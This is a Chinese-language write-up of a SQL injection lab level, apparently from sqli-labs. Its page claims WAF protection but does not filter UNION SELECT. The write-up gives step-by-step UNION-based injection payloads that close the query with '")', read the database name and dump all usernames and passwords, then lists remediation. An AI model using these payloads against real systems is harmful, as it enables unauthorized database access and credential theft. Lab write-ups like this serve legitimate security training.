## 一、靶场信息
- **漏洞类型**：基于联合查询的 SQL 注入。
- **防御机制**：页面提示存在 WAF 保护，但实际测试发现其并未过滤 `UNION` 和 `SELECT` 关键字。
- **通关思路**：识别出后台使用双引号加括号 `")` 闭合，直接使用 `UNION SELECT` 爆出数据。

## 二、核心绕过思路（大白话解析）

这关的页面赫然写着“World's Best WAF”，纯属虚张声势。在实战中，不要被页面的提示吓倒，一切以实际测试结果为准。

这关的锁孔变成了**双引号 + 右括号 `")`**。只要咱们用 `-1")` 把前置条件完美闭合，后面的 `union select` 就能畅通无阻地直接杀入金库。

## 三、详细操作步骤与 Payload 解析

### 第一步：探测回显点

**Payload：**
```text
?id=-1") union select 1,2,3 --+
```

**回显现象：**
页面显示数字 `2` 和 `3`，确认存在 3 列回显。

**大白话解析：**
*   **`id=-1")`**：`-1` 让原查询落空，`"` 闭合后台的双引号，`)` 闭合后台的括号。这套组合拳直接撕开了后台的语法限制。
*   **`union select 1,2,3`**：经典的联合查询测试，强行让数据库多返回三列。因为 WAF 没有拦截，这句代码直接生效。
*   **`--+`**：注释符，把后台原本跟着的 `LIMIT 0,1` 注释掉，防止语法报错。
*   **回显现象**：页面打印出 `2` 和 `3`，说明第 2、3 列是咱们的“广告位”。

### 第二步：爆当前数据库名

**Payload：**
```text
?id=-1") union select 1,database(),3 --+
```

**回显现象：**
页面 `Your Login name:` 后面显示 `security`。

**大白话解析：**
*   利用上一步找到的第 2 列回显位，把数字 `2` 替换成 `database()` 函数。意思就是：“别拿假数据糊弄我，把当前数据库的真名给我打印出来”。

### 第三步：终极脱库（提取账号密码）

**Payload：**
```text
?id=-1") union select 1,group_concat(username,0x3a,password),3 from users --+
```

**回显现象：**
页面成功爆出所有用户的账号密码，例如 `Dumb:Dumb,Angelina:I-kill-you...`。

**大白话解析：**
*   **`group_concat(username,0x3a,password)`**：超级打包机。把 `users` 表里所有的用户名和密码打包成一行，中间用 `0x3a`（冒号的十六进制）连接起来，全部塞到第 2 列。
*   **`from users`**：告诉数据库，去 `users` 表里找数据。

## 四、核心防御机制（Remediation）
- **真 WAF 部署**：不仅是挂个牌子，必须真正配置规则拦截 SQL 关键字和特殊字符。
- **预编译语句（PDO/MySQLi）**：无论 WAF 怎么被绕过，后端的参数化查询能彻底阻断注入执行。
